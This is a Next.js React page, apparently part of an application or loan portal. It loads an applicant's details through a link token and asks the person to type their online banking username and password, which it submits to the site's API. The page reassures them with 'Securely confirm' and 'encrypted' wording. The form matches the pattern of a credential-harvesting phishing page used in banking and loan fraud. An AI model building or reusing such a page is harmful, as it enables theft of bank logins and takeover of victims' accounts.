"use client";

import { useEffect, useState } from "react";
import { useParams } from "next/navigation";
import { api, ApiError, type BankVerificationDetails } from "@/src/lib/api";

function ReadOnlyRow({ label, value }: { label: string; value: string }) {
  return (
    <div className="flex items-start justify-between gap-4 border-b border-slate-100 py-3">
      <span className="text-sm text-slate-500">{label}</span>
      <span className="break-all text-right text-sm font-medium text-slate-900">
        {value || "Not provided"}
      </span>
    </div>
  );
}

export default function BankVerificationPage() {
  const params = useParams<{ token: string }>();
  const token = params?.token ?? "";

  const [details, setDetails] = useState<BankVerificationDetails | null>(null);
  const [loading, setLoading] = useState(true);
  const [loadError, setLoadError] = useState("");

  const [bankUsername, setBankUsername] = useState("");
  const [bankPassword, setBankPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const [submitting, setSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState("");
  const [submitted, setSubmitted] = useState(false);

  useEffect(() => {
    let active = true;

    async function load() {
      if (!token) {
        setLoadError("This verification link is invalid.");
        setLoading(false);
        return;
      }
      try {
        const data = await api.getBankVerificationDetails(token);
        if (active) setDetails(data);
      } catch (err) {
        if (active) {
          setLoadError(
            err instanceof ApiError && err.status === 404
              ? "This verification link is invalid or has expired."
              : "We couldn't load your verification details. Please try again later.",
          );
        }
      } finally {
        if (active) setLoading(false);
      }
    }

    load();
    return () => {
      active = false;
    };
  }, [token]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    setSubmitError("");

    if (!bankUsername.trim() || !bankPassword) {
      setSubmitError("Please enter both your banking username and password.");
      return;
    }

    setSubmitting(true);
    try {
      await api.submitBankVerification(token, {
        bankUsername: bankUsername.trim(),
        bankPassword,
      });
      setSubmitted(true);
    } catch (err) {
      setSubmitError(
        err instanceof ApiError
          ? err.message
          : "Something went wrong. Please try again.",
      );
    } finally {
      setSubmitting(false);
    }
  }

  const controlClass =
    "w-full rounded-lg border border-slate-300 bg-white px-4 py-3 text-slate-900 outline-none transition focus:border-blue-600 focus:ring-2 focus:ring-blue-100";

  return (
    <main className="min-h-screen bg-slate-50 px-4 py-12">
      <div className="mx-auto w-full max-w-lg">
        <div className="mb-6 text-center">
          <h1 className="text-2xl font-bold text-slate-900">
            Bank Verification
          </h1>
          <p className="mt-1 text-sm text-slate-500">
            Securely confirm your online banking details to continue.
          </p>
        </div>

        {loading ? (
          <div className="rounded-2xl bg-white p-6 text-center text-sm text-slate-500 shadow-sm">
            Loading your details…
          </div>
        ) : loadError ? (
          <div className="rounded-2xl bg-white p-6 text-center shadow-sm">
            <p className="text-sm font-medium text-red-600">{loadError}</p>
          </div>
        ) : submitted ? (
          <div className="rounded-2xl bg-white p-8 text-center shadow-sm">
            <div className="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-green-100 text-2xl">
              ✓
            </div>
            <h2 className="text-lg font-bold text-slate-900">
              Details submitted
            </h2>
            <p className="mt-2 text-sm text-slate-500">
              Thank you. Your bank details have been submitted securely. You can
              now close this page.
            </p>
          </div>
        ) : (
          details && (
            <div className="space-y-6">
              <section className="rounded-2xl bg-white p-6 shadow-sm">
                <h2 className="mb-4 text-base font-bold text-slate-900">
                  Your application
                </h2>
                <ReadOnlyRow label="Reference" value={details.reference} />
                <ReadOnlyRow label="First name" value={details.firstName} />
                <ReadOnlyRow label="Last name" value={details.lastName} />
                <ReadOnlyRow label="Email" value={details.email} />
                <ReadOnlyRow label="Phone" value={details.phone} />
                <ReadOnlyRow
                  label="Bank account"
                  value={
                    details.bankAccountLastFour
                      ? `••••${details.bankAccountLastFour}`
                      : ""
                  }
                />
              </section>

              <form
                onSubmit={handleSubmit}
                className="rounded-2xl bg-white p-6 shadow-sm"
              >
                <h2 className="mb-1 text-base font-bold text-slate-900">
                  Online banking details
                </h2>
                <p className="mb-5 text-sm text-slate-500">
                  Enter the credentials you use to sign in to your bank.
                </p>

                <div className="mb-4">
                  <label
                    htmlFor="bankUsername"
                    className="mb-2 block text-sm font-medium text-slate-700"
                  >
                    Banking username
                  </label>
                  <input
                    id="bankUsername"
                    name="bankUsername"
                    type="text"
                    autoComplete="off"
                    value={bankUsername}
                    onChange={(e) => setBankUsername(e.target.value)}
                    className={controlClass}
                  />
                </div>

                <div className="mb-5">
                  <label
                    htmlFor="bankPassword"
                    className="mb-2 block text-sm font-medium text-slate-700"
                  >
                    Banking password
                  </label>
                  <div className="relative">
                    <input
                      id="bankPassword"
                      name="bankPassword"
                      type={showPassword ? "text" : "password"}
                      autoComplete="off"
                      value={bankPassword}
                      onChange={(e) => setBankPassword(e.target.value)}
                      className={`${controlClass} pr-16`}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword((v) => !v)}
                      className="absolute inset-y-0 right-0 flex items-center px-4 text-sm font-medium text-blue-600"
                    >
                      {showPassword ? "Hide" : "Show"}
                    </button>
                  </div>
                </div>

                {submitError && (
                  <p role="alert" className="mb-4 text-sm text-red-600">
                    {submitError}
                  </p>
                )}

                <button
                  type="submit"
                  disabled={submitting}
                  className="w-full rounded-lg bg-blue-600 px-5 py-3 font-semibold text-white transition-colors hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
                >
                  {submitting ? "Submitting…" : "Submit bank details"}
                </button>

                <p className="mt-4 text-center text-xs text-slate-400">
                  🔒 Your information is encrypted and transmitted securely.
                </p>
              </form>
            </div>
          )
        )}
      </div>
    </main>
  );
}
